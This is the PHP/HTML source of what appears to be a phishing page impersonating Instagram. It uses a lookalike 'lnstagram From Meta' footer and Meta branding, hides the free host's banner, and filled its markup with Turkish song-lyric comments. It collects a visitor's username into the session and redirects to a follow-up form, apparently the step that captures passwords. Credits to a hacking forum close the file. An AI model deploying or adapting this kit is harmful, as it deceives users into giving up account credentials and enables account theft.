<?php
include ("app/config.php");
include ("app/database/yazilar.php");
include ("app/database/router.php");
if ($_GET) {
    $username=$_GET["username"];
    session_start();
    $_SESSION["username"]=$username;
    header("location: form.php?nick=$username");

}
?>

<!DOCTYPE html>

<style>img[alt="www.000webhost.com"]{display:none;}</style>

<html>
<!-- Üstüme kapattığınız hiç bi kapıyı açmadım, -->
<head>
<!-- Ben her kavgada can verdim, yalandan savaşmadım. -->
<link rel="stylesheet" href="assets/theme/spex2/css/xss1.css">
<link rel="stylesheet" type="text/css" href="assets/theme/spex2/css/xss2.css">
<!-- Genelde her sokakta kana bulandı gömleğim. -->
<link rel="stylesheet" href="assets/theme/spex2/css/xss3.css">
<!-- Can yakmayı öğrenince düşünmedim dönmeyi. -->
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<!-- Sizi göreni görmeyin, ben yalan mıyım söyleyin ? -->
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
<!-- Eksik olan kalbinizdi, ben nasılsam öyleyim. -->
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

<?php include ("app/tag/main/meta.php"); ?>

<!-- Acımı al diyorum almıyorsun, n'için kalmıyorsun ? -->
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
</head>
<!-- Bu şehir bende kalıcı nefret yarattı. -->
<body>
<!-- Elimi çektim artık kavgadan bu; 'Fetret Zamanı'. -->
<header>
<!-- Çocukluk korkularımı geçecek sanardım -->
<table>
<!-- Adımı söylüyorken hakim bana eşek kadardım. -->
<tr>
<!-- Beni hala sevmezler, nefret edilmeye değmezler bile. -->
<td><img src="assets/theme/spex2/image/meta.svg" width="250" height="70"></td>
<!--  -->

<!-- Size görünen her şey kapkara, körler gerçeği görmezler. -->
</tr>
<!-- Bana 'Aykırı' diyorlar artık, nefret edilmeye değmezler. -->
</table>
<!-- Bana 'Aykırı diyorlar, asla körler gerçeği görmezler. -->
</header>
<!-- Simetrik günler için düzeldim zamanla anne. -->
<center>
<!-- Sonuçta çocukken çok güzeldik babamla değil mi ? -->
<div class="home">
<!-- Belki imkansıza güvendik tamam da  -->
<br><br>
<!-- Neden ağlamaklı gözlerle gülerdik yalandan ? -->
<div class="mx">
<!-- Seni bu bahçelerde çürütücek bir ayrılık, -->
<div class="wrapper fadeInDown">
<!-- Ne kalan tutar ne de gidenler ayrılığın kaydını. -->
<div id="formContent">
<!-- Yüzümüz gülse biraz lan diyoruz bir iş var, -->
<br>
<!-- Ne kadar iyi de olsan kaybedicen saygını ! -->
<div class="fadeIn first">
<!--  -->
<img src="assets/theme/spex2/image/shop.jpg" style="max-width:90%; border-radius:50%;" width="135">
<!-- O dışlanan çocuk benim, biraz şişko, aykırı. -->
<br><br>
<!-- Bu yüzden psikoloğum sağlığımdan kaygılı. -->
<h3 class="title" style="text-align:center;font-family: Helvetica, Arial, Sans-Serif;"><b><?php echo $homebaslik; ?></b></h3>
<!-- Unutmadım yere vurulan kafatasımdan akan kanı.  -->
<p class="text5" style="color: black!important;"><center><?php echo $homeyazi; ?></p>
<!-- 7 aralık 2006, bir mahalle parkı. --></center>
<form autocomplete="off" method="get">
<!-- İnsanları sevmek için bir sebebin var mı ? -->
<input type="text" id="login" name="username" placeholder="Username">
<!-- Benim sebeplerim bir mezarın yanı başında kaldı. -->
<center>
<!-- Hayatı sevmek için bir sebebim vardı. -->
<button type="submit" class="submit">
<!-- Hayat sebeplerden ibaretken onu elimden aldı. -->
<div class="f4x" style="margin-left: 0px;">
<span class="comm">Continue</span>
</div>
</button>
</center>
</form>
</div>
</div>
<br><br>
</div>
</div>
</div>
<h5 class="title2" style="text-align:center;color: white;font-family: Helvetica, Arial, Sans-Serif;"><b>© 2022 lnstagram From Meta.</b></h5>
</center>
</body>
<!-- Not: Şarkı sözlerinin scriptine herhangi bir zararı olmaz, gömülmüş kodlardır. -->
</html>
<!-- Spyhackerz & Killer. -->